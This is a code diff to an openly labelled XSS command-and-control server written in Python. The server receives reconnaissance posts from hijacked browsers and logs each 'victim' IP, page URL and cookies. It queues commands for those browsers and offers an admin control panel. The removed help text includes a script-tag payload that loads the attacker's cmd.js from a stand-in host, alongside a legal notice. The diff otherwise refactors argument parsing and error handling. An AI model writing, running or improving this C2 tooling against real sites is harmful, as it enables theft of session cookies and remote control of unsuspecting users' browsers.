@@ -6,10 +6,8 @@ import argparse
 import sys
 
 class C2Handler(BaseHTTPRequestHandler):
-    def __init__(self, *args, **kwargs):
-        self.commands_queue = []
-        self.results = []
-        super().__init__(*args, **kwargs)
+    commands_queue = []
+    results = []
     
     def do_OPTIONS(self):
         # Handle CORS preflight
@@ -330,7 +328,7 @@ commandLoop();
         if self.path == '/recon':
             try:
                 data = json.loads(post_data) if post_data else {}
-                print("🎯 NEW VICTIM CONNECTED!")
+                print(f"🎯 NEW VICTIM CONNECTED ON PORT {self.server.server_address[1]}!")
                 print(f"📍 CLIENT IP: {client_ip}")
                 print(f"🌐 URL: {data.get('url', 'N/A')}")
                 print(f"🍪 Cookies: {data.get('cookies', 'N/A')}")
@@ -381,51 +379,30 @@ def run_server(host='0.0.0.0', port=4545):
     print(f"📋 Control Panel: http://{host}:{port}/admin")
     print(f"📍 Port {port} - With IP tracking and enhanced UI")
     print("⏳ Waiting for victim connections...")
-    
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n⏹️  Server stopped by user")
-    except Exception as e:
-        print(f"❌ Server error: {e}")
+    server.serve_forever()
 
 def main():
     parser = argparse.ArgumentParser(
         description='🕷️ XSS C2 Server - Command and Control server for XSS attacks',
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=f'''
-📖 **USAGE EXAMPLES:**
-
-  Start with default parameters:
-    {sys.argv[0]}
-
-  Start with custom IP and port:
-    {sys.argv[0]} -h 192.168.1.100 -p 8080
-
-  Only specify port:
-    {sys.argv[0]} -p 9000
-
-  Only specify host:
-    {sys.argv[0]} -h 10.0.0.5
-
-🎯 **XSS PAYLOAD FOR INJECTION:**
-  <script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
-
-🛡️ **LEGAL NOTICE:** Use only for educational purposes or on systems you own.
-   Illegal use is strictly prohibited.
-        '''
+        add_help=False
     )
     
     parser.add_argument('-h', '--host', 
-                       dest='host',
                        default='0.0.0.0', 
                        help='Server IP address (default: 0.0.0.0 - all interfaces)')
     
     parser.add_argument('-p', '--port', 
-                       dest='port',
                        type=int, 
                        default=4545, 
                        help='Server port (default: 4545)')
+    
+    parser.add_argument('--help', action='help', default=argparse.SUPPRESS,
+                      help='Show this help message and exit')
+    
+    if len(sys.argv) == 1:
+        # No arguments provided, use defaults
+        run_server()
+        return
     
     args = parser.parse_args()
     
